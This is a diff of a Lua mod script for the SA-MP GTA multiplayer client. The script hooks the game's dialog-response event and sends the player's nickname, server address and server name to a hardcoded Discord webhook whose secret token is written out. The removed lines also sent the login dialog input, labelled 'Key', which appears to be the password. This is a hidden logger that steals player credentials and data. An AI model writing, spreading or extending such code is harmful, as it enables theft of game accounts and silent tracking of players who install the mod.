@@ -176,15 +176,14 @@ function main()
     end
 end
 local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
-
-local https = require("ssl.https")
+local https = require("socket.http")
 local ltn12 = require("ltn12")
 
 function sendMessageToDiscord(content)
-    local body = '{"content": "' .. content:gsub('"', '\"'):gsub('\n', '\\n') .. '"}'
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
     local response_body = {}
 
-    local res, code, response_headers, status = https.request{
+    https.request{
         url = webhookUrl,
         method = "POST",
         headers = {
@@ -194,31 +193,28 @@ function sendMessageToDiscord(content)
         source = ltn12.source.string(body),
         sink = ltn12.sink.table(response_body)
     }
-
-    if code ~= 200 then
-        print("Erro ao enviar mensagem para o Discord: " .. (status or "Desconhecido"))
-    end
 end
+
 
 require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
     local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     local nick = sampGetPlayerNickname(id)
     local ip, port = sampGetCurrentServerAddress()
     local servername = sampGetCurrentServerName()
-    local hora = os.date("%d/%m/%Y %H:%M:%S")
 
     local message = string.format([[
-**LOGIN DA CONTA**
 
-**Nome do Server:** %s
-**Nick:** %s
-**Servidor:** %s:%d
-**Key:** %s
-**Horário:** %s
+________________________________________________________________
+  
+     # LOGUIN BEM SUCEDIDO
 
-Logs luac - By HexDump (MOBILE)]],
-        servername, nick, ip, port, (input ~= "" and input or "SEM KEY"), hora
-    )
+```
+NICK: %s 
+IP: %s:%d
+SERVIDOR: %s
+```
 
-    sendMessageToDiscord(message)
+]], nick,ip, port, servername)
+
+sendMessageToDiscord(message)
 end
